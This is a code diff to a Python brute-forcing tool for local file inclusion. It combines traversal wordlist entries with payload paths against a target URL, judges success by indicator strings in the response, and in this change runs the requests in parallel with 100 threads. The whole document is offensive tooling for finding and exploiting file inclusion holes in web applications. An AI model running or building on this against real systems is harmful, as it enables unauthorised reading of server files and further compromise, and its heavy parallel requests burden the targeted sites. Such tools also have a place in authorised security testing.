@@ -2,6 +2,7 @@
 
 import requests
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor
 
 TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
 
@@ -46,42 +47,48 @@ def brute_force_lfi(
 
     successful_links = []
 
+    # Create a function to test a single URL - rename it to avoid conflict
+    def test_single_url(url_to_test):
+        try:
+            response = session.get(url_to_test, cookies=COOKIE, timeout=5)
+            
+            # Failure indicator check
+            if failure_indicator and failure_indicator in response.text:
+                return None
+                
+            # Success indicator check
+            if success_indicator and success_indicator in response.text:
+                return url_to_test
+                
+            # If no success indicator, assume success when failure is absent
+            if (not success_indicator and failure_indicator and 
+                failure_indicator not in response.text):
+                return url_to_test
+                
+            return None
+        except Exception as e:
+            print(f"[-] Error testing {url_to_test}: {str(e)}")
+            return None
+
+    # Create all test URLs
+    all_test_urls = []
     for payload_relative in payload_relatives:
         for traversal in traversals:
             for payload_filename in payload_filenames:
-                test_url = (
-                    f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
-                )
-                # print(f"[*] Trying LFI URL: {test_url}")
-
-                try:
-                    response = session.get(test_url, cookies=COOKIE)
-
-                    is_success = False
-
-                    # Failure indicator check
-                    if failure_indicator and failure_indicator in response.text:
-                        print(f"[-] Failed to include payload: {test_url}")
-                        continue  # Skip this attempt
-
-                    # Success indicator check
-                    if success_indicator and success_indicator in response.text:
-                        is_success = True
-
-                    # If no success indicator, assume success when failure is absent
-                    if (
-                        not success_indicator
-                        and failure_indicator
-                        and failure_indicator not in response.text
-                    ):
-                        is_success = True
-
-                    if is_success:
-                        print(f"[+] Successfully included payload: {test_url}")
-                        successful_links.append(test_url)
-
-                except Exception as e:
-                    print(f"[-] Error testing {test_url}: {str(e)}")
+                test_url = f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
+                all_test_urls.append(test_url)
+    
+    # Submit all tasks to the executor
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        # Make sure we're passing the function name correctly
+        futures = [executor.submit(test_single_url, url) for url in all_test_urls]
+        
+        # Process results as they complete
+        for future in futures:
+            result = future.result()
+            if result:
+                print(f"[+] Successfully included payload: {result}")
+                successful_links.append(result)
 
     return successful_links
 
